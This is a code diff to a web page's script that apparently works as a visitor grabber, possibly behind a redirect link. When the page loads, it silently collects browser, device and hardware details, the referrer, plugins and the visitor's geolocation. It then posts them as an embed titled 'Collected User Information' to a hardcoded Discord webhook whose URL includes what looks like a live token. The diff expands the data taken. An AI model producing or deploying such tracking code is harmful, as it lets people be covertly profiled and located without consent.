@@ -13,8 +13,48 @@
             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
         }
 
+        // Function to detect device type
+        function detectDevice() {
+            const ua = navigator.userAgent;
+            if (/tablet|ipad|playbook|silk|android(?!.*mobi)/i.test(ua)) {
+                return "Tablet";
+            }
+            if (/Mobile|Android|iP(hone|od)|IEMobile|Opera Mini/i.test(ua)) {
+                return "Mobile";
+            }
+            return "Desktop";
+        }
+
+        // Function to get installed plugins
+        function getPlugins() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            return plugins.join(', ') || 'No plugins detected';
+        }
+
+        // Function to get approximate location
+        function getLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        callback({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    error => {
+                        callback({ latitude: 'Unavailable', longitude: 'Unavailable' });
+                    }
+                );
+            } else {
+                callback({ latitude: 'Unsupported', longitude: 'Unsupported' });
+            }
+        }
+
         // Function to gather data
-        function gatherData() {
+        function gatherData(callback) {
             const data = {
                 userAgent: navigator.userAgent,
                 language: navigator.language,
@@ -25,18 +65,55 @@
                 colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 referrer: document.referrer,
+                currentUrl: window.location.href,
+                onlineStatus: navigator.onLine,
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
+                deviceType: detectDevice(),
+                plugins: getPlugins(),
                 id: getUrlParameter('id'),
                 url: getUrlParameter('url')
             };
 
-            return data;
+            getLocation(location => {
+                data.latitude = location.latitude;
+                data.longitude = location.longitude;
+                callback(data);
+            });
         }
 
         // Function to send data to Discord webhook
         function sendToDiscord(data) {
             const wurl = 'https://discord.com/api/webhooks/1270437580734730351/xtG0i70kO_TFqufkI9os4jCAqJZ3cr9S6p3eCAtc0z044qBk-XNE3dQ-XhJ-dDWTi7rs';
+            const embed = {
+                title: "Collected User Information",
+                color: 3447003,
+                fields: [
+                    { name: "ID", value: data.id || 'N/A', inline: true },
+                    { name: "Current URL", value: data.currentUrl, inline: true },
+                    { name: "User Agent", value: data.userAgent, inline: false },
+                    { name: "Language", value: data.language, inline: true },
+                    { name: "Platform", value: data.platform, inline: true },
+                    { name: "Cookies Enabled", value: data.cookiesEnabled ? 'Yes' : 'No', inline: true },
+                    { name: "Screen Resolution", value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
+                    { name: "Color Depth", value: `${data.colorDepth} bits`, inline: true },
+                    { name: "Timezone", value: data.timezone, inline: true },
+                    { name: "Referrer", value: data.referrer || 'N/A', inline: false },
+                    { name: "Online Status", value: data.onlineStatus ? 'Online' : 'Offline', inline: true },
+                    { name: "CPU Cores", value: data.cpuCores.toString(), inline: true },
+                    { name: "Memory", value: `${data.memory} GB`, inline: true },
+                    { name: "Device Type", value: data.deviceType, inline: true },
+                    { name: "Plugins", value: data.plugins, inline: false },
+                    { name: "Latitude", value: data.latitude.toString(), inline: true },
+                    { name: "Longitude", value: data.longitude.toString(), inline: true },
+                    { name: "Redirect URL", value: data.url || 'N/A', inline: false }
+                ],
+                timestamp: new Date()
+            };
+
             const message = {
-                content: `**Data Collected:**\n${JSON.stringify(data, null, 2)}`
+                username: "Data Collector",
+                embeds: [embed]
             };
 
             fetch(wurl, {
@@ -55,8 +132,9 @@
 
         // On page load, gather data and send it
         window.onload = function () {
-            const data = gatherData();
-            sendToDiscord(data);
+            gatherData(data => {
+                sendToDiscord(data);
+            });
         };
     </script>
 </head>
